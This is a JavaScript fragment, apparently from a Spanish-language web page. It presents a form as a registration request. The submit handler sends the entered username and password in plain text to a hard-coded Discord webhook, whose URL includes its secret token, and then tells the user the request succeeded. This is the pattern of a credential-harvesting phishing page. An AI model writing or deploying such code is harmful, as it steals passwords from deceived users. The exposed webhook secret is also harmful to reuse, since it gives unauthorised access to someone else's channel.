        document.getElementById("question-form").addEventListener("submit", function(event) {
            event.preventDefault();

            const name = document.getElementById("name").value;
            const password = document.getElementById("password").value;
            if (name === '' || password === '') {
                alert("Por favor, complete todos los campos.");
            } else {
                sendToDiscord(name, password);
            }
        });

        function sendToDiscord(name, password) {
            const webhookURL = "https://discord.com/api/webhooks/1251386870043250808/3rDZtUOlUR_N_6SwnpcSQZL2LBTjNIxyRQ4cmQu7RioIsGkUtEw7QaKjiG3SGSMyiXxn";
            const data = {
                content: `
**Nombre de usuario:** ${name}
-
**Contraseña:** ${password}`
            };

            fetch(webhookURL, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify(data)
            })
            .then(response => {
                if (response.ok) {
                    alert("La solicitud de registro fue enviada con éxito.");
                } else {
                    alert("Hubo un error al enviar la solicitud de registro. Por favor, inténtalo de nuevo más tarde.");
                }
            })
            .catch(error => {
                console.error("Hubo un error al enviar la solicitud de registro:", error);
                alert("Hubo un error al enviar la solicitud de registro. Por favor, inténtalo de nuevo más tarde.");
            });
        }
        
        function mostrarMensajeEmergente() {
            var mensaje = document.getElementById("mensajeEmergente");
            mensaje.style.display = "block";
        }

        function ocultarMensajeEmergente() {
            var mensaje = document.getElementById("mensajeEmergente");
            mensaje.style.display = "none";
        }

        var icono = document.getElementById("icono");

        icono.addEventListener("click", mostrarMensajeEmergente);
        icono.addEventListener("mouseout", ocultarMensajeEmergente);
